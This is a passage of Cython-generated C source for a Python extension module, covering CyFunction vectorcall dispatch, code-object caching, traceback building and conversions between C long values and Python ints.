*kwnames)\n{\n    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;\n#if CYTHON_BACKPORT_VECTORCALL\n    Py_ssize_t nargs = (Py_ssize_t)nargsf;\n#else\n    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);\n#endif\n    PyObject *self;\n#if CYTHON_COMPILING_IN_LIMITED_API\n    PyCFunction meth = PyCFunction_GetFunction(cyfunc->func);\n    if (unlikely(!meth)) return NULL;\n#else\n    PyCFunction meth = ((PyCFunctionObject*)cyfunc)->m_ml->ml_meth;\n#endif\n    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, kwnames)) {\n    case 1:\n        self = args[0];\n        args += 1;\n        nargs -= 1;\n        break;\n    case 0:\n#if CYTHON_COMPILING_IN_LIMITED_API\n        self = PyCFunction_GetSelf(((__pyx_CyFunctionObject*)cyfunc)->func);\n        if (unlikely(!self) && PyErr_Occurred()) return NULL;\n#else\n        self = ((PyCFunctionObject*)cyfunc)->m_self;\n#endif\n        break;\n    default:\n        return NULL;\n    }\n    if (unlikely(nargs != 0)) {\n        __Pyx_CyFunction_raise_argument_count_error(\n            cyfunc, "takes no arguments", nargs);\n        return NULL;\n    }\n    return meth(self, NULL);\n}\nstatic PyObject * __Pyx_CyFunction_Vectorcall_O(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)\n{\n    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;\n#if CYTHON_BACKPORT_VECTORCALL\n    Py_ssize_t nargs = (Py_ssize_t)nargsf;\n#else\n    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);\n#endif\n    PyObject *self;\n#if CYTHON_COMPILING_IN_LIMITED_API\n    PyCFunction meth = PyCFunction_GetFunction(cyfunc->func);\n    if (unlikely(!meth)) return NULL;\n#else\n    PyCFunction meth = ((PyCFunctionObject*)cyfunc)->m_ml->ml_meth;\n#endif\n    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, kwnames)) {\n    case 1:\n        self = args[0];\n        args += 1;\n        nargs -= 1;\n        break;\n    case 0:\n#if CYTHON_COMPILING_IN_LIMITED_API\n        self = PyCFunction_GetSelf(((__pyx_CyFunctionObject*)cyfunc)->func);\n        if (unlikely(!self) && PyErr_Occurred()) return NULL;\n#else\n        self = ((PyCFunctionObject*)cyfunc)->m_self;\n#endif\n        break;\n    default:\n        return NULL;\n    }\n    if (unlikely(nargs != 1)) {\n        __Pyx_CyFunction_raise_argument_count_error(\n            cyfunc, "takes exactly one argument", nargs);\n        return NULL;\n    }\n    return meth(self, args[0]);\n}\nstatic PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)\n{\n    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;\n#if CYTHON_BACKPORT_VECTORCALL\n    Py_ssize_t nargs = (Py_ssize_t)nargsf;\n#else\n    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);\n#endif\n    PyObject *self;\n#if CYTHON_COMPILING_IN_LIMITED_API\n    PyCFunction meth = PyCFunction_GetFunction(cyfunc->func);\n    if (unlikely(!meth)) return NULL;\n#else\n    PyCFunction meth = ((PyCFunctionObject*)cyfunc)->m_ml->ml_meth;\n#endif\n    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, NULL)) {\n    case 1:\n        self = args[0];\n        args += 1;\n        nargs -= 1;\n        break;\n    case 0:\n#if CYTHON_COMPILING_IN_LIMITED_API\n        self = PyCFunction_GetSelf(((__pyx_CyFunctionObject*)cyfunc)->func);\n        if (unlikely(!self) && PyErr_Occurred()) return NULL;\n#else\n        self = ((PyCFunctionObject*)cyfunc)->m_self;\n#endif\n        break;\n    default:\n        return NULL;\n    }\n    return ((__Pyx_PyCFunctionFastWithKeywords)(void(*)(void))meth)(self, args, nargs, kwnames);\n}\nstatic PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS_METHOD(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)\n{\n    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;\n    PyTypeObject *cls = (PyTypeObject *) __Pyx_CyFunction_GetClassObj(cyfunc);\n#if CYTHON_BACKPORT_VECTORCALL\n    Py_ssize_t nargs = (Py_ssize_t)nargsf;\n#else\n    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);\n#endif\n    PyObject *self;\n#if CYTHON_COMPILING_IN_LIMITED_API\n    PyCFunction meth = PyCFunction_GetFunction(cyfunc->func);\n    if (unlikely(!meth)) return NULL;\n#else\n    PyCFunction meth = ((PyCFunctionObject*)cyfunc)->m_ml->ml_meth;\n#endif\n    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, NULL)) {\n    case 1:\n        self = args[0];\n        args += 1;\n        nargs -= 1;\n        break;\n    case 0:\n#if CYTHON_COMPILING_IN_LIMITED_API\n        self = PyCFunction_GetSelf(((__pyx_CyFunctionObject*)cyfunc)->func);\n        if (unlikely(!self) && PyErr_Occurred()) return NULL;\n#else\n        self = ((PyCFunctionObject*)cyfunc)->m_self;\n#endif\n        break;\n    default:\n        return NULL;\n    }\n    return ((__Pyx_PyCMethod)(void(*)(void))meth)(self, cls, args, (size_t)nargs, kwnames);\n}\n#endif\nstatic PyType_Slot __pyx_CyFunctionType_slots[] = {\n    {Py_tp_dealloc, (void *)__Pyx_CyFunction_dealloc},\n    {Py_tp_repr, (void *)__Pyx_CyFunction_repr},\n    {Py_tp_call, (void *)__Pyx_CyFunction_CallAsMethod},\n    {Py_tp_traverse, (void *)__Pyx_CyFunction_traverse},\n    {Py_tp_clear, (void *)__Pyx_CyFunction_clear},\n    {Py_tp_methods, (void *)__pyx_CyFunction_methods},\n    {Py_tp_members, (void *)__pyx_CyFunction_members},\n    {Py_tp_getset, (void *)__pyx_CyFunction_getsets},\n    {Py_tp_descr_get, (void *)__Pyx_PyMethod_New},\n    {0, 0},\n};\nstatic PyType_Spec __pyx_CyFunctionType_spec = {\n    __PYX_TYPE_MODULE_PREFIX "cython_function_or_method",\n    sizeof(__pyx_CyFunctionObject),\n    0,\n#ifdef Py_TPFLAGS_METHOD_DESCRIPTOR\n    Py_TPFLAGS_METHOD_DESCRIPTOR |\n#endif\n#if CYTHON_METH_FASTCALL\n#if defined(Py_TPFLAGS_HAVE_VECTORCALL)\n    Py_TPFLAGS_HAVE_VECTORCALL |\n#elif defined(_Py_TPFLAGS_HAVE_VECTORCALL)\n    _Py_TPFLAGS_HAVE_VECTORCALL |\n#endif\n#endif // CYTHON_METH_FASTCALL\n#if PY_VERSION_HEX >= 0x030A0000\n    Py_TPFLAGS_IMMUTABLETYPE |\n#endif\n    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_BASETYPE,\n    __pyx_CyFunctionType_slots\n};\nstatic int __pyx_CyFunction_init(PyObject *module) {\n    __pyx_mstatetype *mstate = __Pyx_PyModule_GetState(module);\n    mstate->__pyx_CyFunctionType = __Pyx_FetchCommonTypeFromSpec(\n        mstate->__pyx_CommonTypesMetaclassType, module, &__pyx_CyFunctionType_spec, NULL);\n    if (unlikely(mstate->__pyx_CyFunctionType == NULL)) {\n        return -1;\n    }\n    return 0;\n}\nstatic CYTHON_INLINE PyObject *__Pyx_CyFunction_InitDefaults(PyObject *func, PyTypeObject *defaults_type) {\n    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;\n    m->defaults = PyObject_CallObject((PyObject*)defaults_type, NULL); // _PyObject_New(defaults_type);\n    if (unlikely(!m->defaults))\n        return NULL;\n    return m->defaults;\n}\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {\n    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;\n    m->defaults_tuple = tuple;\n    Py_INCREF(tuple);\n}\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {\n    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;\n    m->defaults_kwdict = dict;\n    Py_INCREF(dict);\n}\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {\n    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;\n    m->func_annotations = dict;\n    Py_INCREF(dict);\n}\n\n\nstatic PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,\n                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {\n    PyObject *op = __Pyx_CyFunction_Init(\n        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_mstate_global->__pyx_CyFunctionType),\n        ml, flags, qualname, closure, module, globals, code\n    );\n    if (likely(op)) {\n        PyObject_GC_Track(op);\n    }\n    return op;\n}\n\n\n#if CYTHON_CLINE_IN_TRACEBACK && CYTHON_CLINE_IN_TRACEBACK_RUNTIME\nstatic int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line) {\n    PyObject *use_cline;\n    PyObject *ptype, *pvalue, *ptraceback;\n#if CYTHON_COMPILING_IN_CPYTHON\n    PyObject **cython_runtime_dict;\n#endif\n    CYTHON_MAYBE_UNUSED_VAR(tstate);\n    if (unlikely(!__pyx_mstate_global->__pyx_cython_runtime)) {\n        return c_line;\n    }\n    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\n#if CYTHON_COMPILING_IN_CPYTHON\n    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_mstate_global->__pyx_cython_runtime);\n    if (likely(cython_runtime_dict)) {\n        __Pyx_BEGIN_CRITICAL_SECTION(*cython_runtime_dict);\n        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(\n            use_cline, *cython_runtime_dict,\n            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_mstate_global->__pyx_n_u_cline_in_traceback))\n        Py_XINCREF(use_cline);\n        __Pyx_END_CRITICAL_SECTION();\n    } else\n#endif\n    {\n      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStrNoError(__pyx_mstate_global->__pyx_cython_runtime, __pyx_mstate_global->__pyx_n_u_cline_in_traceback);\n      if (use_cline_obj) {\n        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;\n        Py_INCREF(use_cline);\n        Py_DECREF(use_cline_obj);\n      } else {\n        PyErr_Clear();\n        use_cline = NULL;\n      }\n    }\n    if (!use_cline) {\n        c_line = 0;\n        (void) PyObject_SetAttr(__pyx_mstate_global->__pyx_cython_runtime, __pyx_mstate_global->__pyx_n_u_cline_in_traceback, Py_False);\n    }\n    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {\n        c_line = 0;\n    }\n    Py_XDECREF(use_cline);\n    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\n    return c_line;\n}\n#endif\n\n\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {\n    int start = 0, mid = 0, end = count - 1;\n    if (end >= 0 && code_line > entries[end].code_line) {\n        return count;\n    }\n    while (start < end) {\n        mid = start + (end - start) / 2;\n        if (code_line < entries[mid].code_line) {\n            end = mid;\n        } else if (code_line > entries[mid].code_line) {\n             start = mid + 1;\n        } else {\n            return mid;\n        }\n    }\n    if (code_line <= entries[mid].code_line) {\n        return mid;\n    } else {\n        return mid + 1;\n    }\n}\nstatic __Pyx_CachedCodeObjectType *__pyx__find_code_object(struct __Pyx_CodeObjectCache *code_cache, int code_line) {\n    __Pyx_CachedCodeObjectType* code_object;\n    int pos;\n    if (unlikely(!code_line) || unlikely(!code_cache->entries)) {\n        return NULL;\n    }\n    pos = __pyx_bisect_code_objects(code_cache->entries, code_cache->count, code_line);\n    if (unlikely(pos >= code_cache->count) || unlikely(code_cache->entries[pos].code_line != code_line)) {\n        return NULL;\n    }\n    code_object = code_cache->entries[pos].code_object;\n    Py_INCREF(code_object);\n    return code_object;\n}\nstatic __Pyx_CachedCodeObjectType *__pyx_find_code_object(int code_line) {\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING && !CYTHON_ATOMICS\n    (void)__pyx__find_code_object;\n    return NULL; // Most implementation should have atomics. But otherwise, don\'t make it thread-safe, just miss.\n#else\n    struct __Pyx_CodeObjectCache *code_cache = &__pyx_mstate_global->__pyx_code_cache;\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    __pyx_nonatomic_int_type old_count = __pyx_atomic_incr_acq_rel(&code_cache->accessor_count);\n    if (old_count < 0) {\n        __pyx_atomic_decr_acq_rel(&code_cache->accessor_count);\n        return NULL;\n    }\n#endif\n    __Pyx_CachedCodeObjectType *result = __pyx__find_code_object(code_cache, code_line);\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    __pyx_atomic_decr_acq_rel(&code_cache->accessor_count);\n#endif\n    return result;\n#endif\n}\nstatic void __pyx__insert_code_object(struct __Pyx_CodeObjectCache *code_cache, int code_line, __Pyx_CachedCodeObjectType* code_object)\n{\n    int pos, i;\n    __Pyx_CodeObjectCacheEntry* entries = code_cache->entries;\n    if (unlikely(!code_line)) {\n        return;\n    }\n    if (unlikely(!entries)) {\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));\n        if (likely(entries)) {\n            code_cache->entries = entries;\n            code_cache->max_count = 64;\n            code_cache->count = 1;\n            entries[0].code_line = code_line;\n            entries[0].code_object = code_object;\n            Py_INCREF(code_object);\n        }\n        return;\n    }\n    pos = __pyx_bisect_code_objects(code_cache->entries, code_cache->count, code_line);\n    if ((pos < code_cache->count) && unlikely(code_cache->entries[pos].code_line == code_line)) {\n        __Pyx_CachedCodeObjectType* tmp = entries[pos].code_object;\n        entries[pos].code_object = code_object;\n        Py_INCREF(code_object);\n        Py_DECREF(tmp);\n        return;\n    }\n    if (code_cache->count == code_cache->max_count) {\n        int new_max = code_cache->max_count + 64;\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(\n            code_cache->entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));\n        if (unlikely(!entries)) {\n            return;\n        }\n        code_cache->entries = entries;\n        code_cache->max_count = new_max;\n    }\n    for (i=code_cache->count; i>pos; i--) {\n        entries[i] = entries[i-1];\n    }\n    entries[pos].code_line = code_line;\n    entries[pos].code_object = code_object;\n    code_cache->count++;\n    Py_INCREF(code_object);\n}\nstatic void __pyx_insert_code_object(int code_line, __Pyx_CachedCodeObjectType* code_object) {\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING && !CYTHON_ATOMICS\n    (void)__pyx__insert_code_object;\n    return; // Most implementation should have atomics. But otherwise, don\'t make it thread-safe, just fail.\n#else\n    struct __Pyx_CodeObjectCache *code_cache = &__pyx_mstate_global->__pyx_code_cache;\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    __pyx_nonatomic_int_type expected = 0;\n    if (!__pyx_atomic_int_cmp_exchange(&code_cache->accessor_count, &expected, INT_MIN)) {\n        return;\n    }\n#endif\n    __pyx__insert_code_object(code_cache, code_line, code_object);\n#if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    __pyx_atomic_sub(&code_cache->accessor_count, INT_MIN);\n#endif\n#endif\n}\n\n\n#include "compile.h"\n#include "frameobject.h"\n#include "traceback.h"\n#if PY_VERSION_HEX >= 0x030b00a6 && !CYTHON_COMPILING_IN_LIMITED_API && !defined(PYPY_VERSION)\n  #ifndef Py_BUILD_CORE\n    #define Py_BUILD_CORE 1\n  #endif\n  #include "internal/pycore_frame.h"\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic PyObject *__Pyx_PyCode_Replace_For_AddTraceback(PyObject *code, PyObject *scratch_dict,\n                                                       PyObject *firstlineno, PyObject *name) {\n    PyObject *replace = NULL;\n    if (unlikely(PyDict_SetItemString(scratch_dict, "co_firstlineno", firstlineno))) return NULL;\n    if (unlikely(PyDict_SetItemString(scratch_dict, "co_name", name))) return NULL;\n    replace = PyObject_GetAttrString(code, "replace");\n    if (likely(replace)) {\n        PyObject *result = PyObject_Call(replace, __pyx_mstate_global->__pyx_empty_tuple, scratch_dict);\n        Py_DECREF(replace);\n        return result;\n    }\n    PyErr_Clear();\n    return NULL;\n}\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename) {\n    PyObject *code_object = NULL, *py_py_line = NULL, *py_funcname = NULL, *dict = NULL;\n    PyObject *replace = NULL, *getframe = NULL, *frame = NULL;\n    PyObject *exc_type, *exc_value, *exc_traceback;\n    int success = 0;\n    if (c_line) {\n        (void) __pyx_cfilenm;\n        (void) __Pyx_CLineForTraceback(__Pyx_PyThreadState_Current, c_line);\n    }\n    PyErr_Fetch(&exc_type, &exc_value, &exc_traceback);\n    code_object = __pyx_find_code_object(c_line ? -c_line : py_line);\n    if (!code_object) {\n        code_object = Py_CompileString("_getframe()", filename, Py_eval_input);\n        if (unlikely(!code_object)) goto bad;\n        py_py_line = PyLong_FromLong(py_line);\n        if (unlikely(!py_py_line)) goto bad;\n        py_funcname = PyUnicode_FromString(funcname);\n        if (unlikely(!py_funcname)) goto bad;\n        dict = PyDict_New();\n        if (unlikely(!dict)) goto bad;\n        {\n            PyObject *old_code_object = code_object;\n            code_object = __Pyx_PyCode_Replace_For_AddTraceback(code_object, dict, py_py_line, py_funcname);\n            Py_DECREF(old_code_object);\n        }\n        if (unlikely(!code_object)) goto bad;\n        __pyx_insert_code_object(c_line ? -c_line : py_line, code_object);\n    } else {\n        dict = PyDict_New();\n    }\n    getframe = PySys_GetObject("_getframe");\n    if (unlikely(!getframe)) goto bad;\n    if (unlikely(PyDict_SetItemString(dict, "_getframe", getframe))) goto bad;\n    frame = PyEval_EvalCode(code_object, dict, dict);\n    if (unlikely(!frame) || frame == Py_None) goto bad;\n    success = 1;\n  bad:\n    PyErr_Restore(exc_type, exc_value, exc_traceback);\n    Py_XDECREF(code_object);\n    Py_XDECREF(py_py_line);\n    Py_XDECREF(py_funcname);\n    Py_XDECREF(dict);\n    Py_XDECREF(replace);\n    if (success) {\n        PyTraceBack_Here(\n            (struct _frame*)frame);\n    }\n    Py_XDECREF(frame);\n}\n#else\nstatic PyCodeObject* __Pyx_CreateCodeObjectForTraceback(\n            const char *funcname, int c_line,\n            int py_line, const char *filename) {\n    PyCodeObject *py_code = NULL;\n    PyObject *py_funcname = NULL;\n    if (c_line) {\n        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);\n        if (!py_funcname) goto bad;\n        funcname = PyUnicode_AsUTF8(py_funcname);\n        if (!funcname) goto bad;\n    }\n    py_code = PyCode_NewEmpty(filename, funcname, py_line);\n    Py_XDECREF(py_funcname);\n    return py_code;\nbad:\n    Py_XDECREF(py_funcname);\n    return NULL;\n}\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename) {\n    PyCodeObject *py_code = 0;\n    PyFrameObject *py_frame = 0;\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\n    PyObject *ptype, *pvalue, *ptraceback;\n    if (c_line) {\n        c_line = __Pyx_CLineForTraceback(tstate, c_line);\n    }\n    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);\n    if (!py_code) {\n        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\n        py_code = __Pyx_CreateCodeObjectForTraceback(\n            funcname, c_line, py_line, filename);\n        if (!py_code) {\n            \n            Py_XDECREF(ptype);\n            Py_XDECREF(pvalue);\n            Py_XDECREF(ptraceback);\n            goto bad;\n        }\n        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\n        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);\n    }\n    py_frame = PyFrame_New(\n        tstate,            \n        py_code,           \n        __pyx_mstate_global->__pyx_d,    \n        0                  \n    );\n    if (!py_frame) goto bad;\n    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);\n    PyTraceBack_Here(py_frame);\nbad:\n    Py_XDECREF(py_code);\n    Py_XDECREF(py_frame);\n}\n#endif\n\n\n#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)\n#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)\n#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\\\n    {\\\n        func_type value = func_value;\\\n        if (sizeof(target_type) < sizeof(func_type)) {\\\n            if (unlikely(value != (func_type) (target_type) value)) {\\\n                func_type zero = 0;\\\n                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\\\n                    return (target_type) -1;\\\n                if (is_unsigned && unlikely(value < zero))\\\n                    goto raise_neg_overflow;\\\n                else\\\n                    goto raise_overflow;\\\n            }\\\n        }\\\n        return (target_type) value;\\\n    }\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyLong_From_long(long value) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored "-Wconversion"\n#endif\n    const long neg_one = (long) -1, const_zero = (long) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n    if (is_unsigned) {\n        if (sizeof(long) < sizeof(long)) {\n            return PyLong_FromLong((long) value);\n        } else if (sizeof(long) <= sizeof(unsigned long)) {\n            return PyLong_FromUnsignedLong((unsigned long) value);\n#if defined(HAVE_LONG_LONG) && !CYTHON_COMPILING_IN_PYPY\n        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\n            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);\n#endif\n        }\n    } else {\n        if (sizeof(long) <= sizeof(long)) {\n            return PyLong_FromLong((long) value);\n#ifdef HAVE_LONG_LONG\n        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\n            return PyLong_FromLongLong((PY_LONG_LONG) value);\n#endif\n        }\n    }\n    {\n        unsigned char *bytes = (unsigned char *)&value;\n#if !CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX >= 0x030d00A4\n        if (is_unsigned) {\n            return PyLong_FromUnsignedNativeBytes(bytes, sizeof(value), -1);\n        } else {\n            return PyLong_FromNativeBytes(bytes, sizeof(value), -1);\n        }\n#elif !CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030d0000\n        int one = 1; int little = (int)*(unsigned char *)&one;\n        return _PyLong_FromByteArray(bytes, sizeof(long),\n                                     little, !is_unsigned);\n#else\n        int one = 1; int little = (int)*(unsigned char *)&one;\n        PyObject *from_bytes, *result = NULL, *kwds = NULL;\n        PyObject *py_bytes = NULL, *order_str = NULL;\n        from_bytes = PyObject_GetAttrString((PyObject*)&PyLong_Type, "from_bytes");\n        if (!from_bytes) return NULL;\n        py_bytes = PyBytes_FromStringAndSize((char*)bytes, sizeof(long));\n        if (!py_bytes) goto limited_bad;\n        order_str = PyUnicode_FromString(little ? "little" : "big");\n        if (!order_str) goto limited_bad;\n        {\n            PyObject *args[3+(CYTHON_VECTORCALL ? 1 : 0)] = { NULL, py_bytes, order_str };\n            if (!is_unsigned) {\n                kwds = __Pyx_MakeVectorcallBuilderKwds(1);\n                if (!kwds) goto limited_bad;\n                if (__Pyx_VectorcallBuilder_AddArgStr("signed", __Pyx_NewRef(Py_True), kwds, args+3, 0) < 0) goto limited_bad;\n            }\n            result = __Pyx_Object_Vectorcall_CallFromBuilder(from_bytes, args+1, 2 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET, kwds);\n        }\n        limited_bad:\n        Py_XDECREF(kwds);\n        Py_XDECREF(order_str);\n        Py_XDECREF(py_bytes);\n        Py_XDECREF(from_bytes);\n        return result;\n#endif\n    }\n}\n\n\nstatic CYTHON_INLINE long __Pyx_PyLong_As_long(PyObject *x) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored "-Wconversion"\n#endif\n    const long neg_one = (long) -1, const_zero = (long) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n    if (unlikely(!PyLong_Check(x))) {\n        long val;\n        PyObject *tmp = __Pyx_PyNumber_Long(x);\n        if (!tmp) return (long) -1;\n        val = __Pyx_PyLong_As_long(tmp);\n        Py_DECREF(tmp);\n        return val;\n    }\n    if (is_unsigned) {\n#if CYTHON_USE_PYLONG_INTERNALS\n        if (unlikely(__Pyx_PyLong_IsNeg(x))) {\n            goto raise_neg_overflow;\n        } else if (__Pyx_PyLong_IsCompact(x)) {\n            __PYX_VERIFY_RETURN_INT(long, __Pyx_compact_upylong, __Pyx_PyLong_CompactValueUnsigned(x))\n        } else {\n            const digit* digits = __Pyx_PyLong_Digits(x);\n            assert(__Pyx_PyLong_DigitCount(x) > 1);\n            switch (__Pyx_PyLong_DigitCount(x)) {\n                case 2:\n                    if ((8 * sizeof(long) > 1 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) >= 2 * PyLong_SHIFT)) {\n                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n                case 3:\n                    if ((8 * sizeof(long) > 2 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) >= 3 * PyLong_SHIFT)) {\n                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n                case 4:\n                    if ((8 * sizeof(long) > 3 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) >= 4 * PyLong_SHIFT)) {\n                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n            }\n        }\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A7\n        if (unlikely(Py_SIZE(x) < 0)) {\n            goto raise_neg_overflow;\n        }\n#else\n        {\n            int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n            if (unlikely(result < 0))\n                return (long) -1;\n            if (unlikely(result == 1))\n                goto raise_neg_overflow;\n        }\n#endif\n        if ((sizeof(long) <= sizeof(unsigned long))) {\n            __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))\n#ifdef HAVE_LONG_LONG\n        } else if ((sizeof(long) <= sizeof(unsigned PY_LONG_LONG))) {\n            __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\n#endif\n        }\n    } else {\n#if CYTHON_USE_PYLONG_INTERNALS\n        if (__Pyx_PyLong_IsCompact(x)) {\n            __PYX_VERIFY_RETURN_INT(long, __Pyx_compact_pylong, __Pyx_PyLong_CompactValue(x))\n        } else {\n            const digit* digits = __Pyx_PyLong_Digits(x);\n            assert(__Pyx_PyLong_DigitCount(x) > 1);\n            switch (__Pyx_PyLong_SignedDigitCount(x)) {\n                case -2:\n                    if ((8 * sizeof(long) - 1 > 1 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {\n                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 2:\n                    if ((8 * sizeof(long) > 1 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {\n                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case -3:\n                    if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << 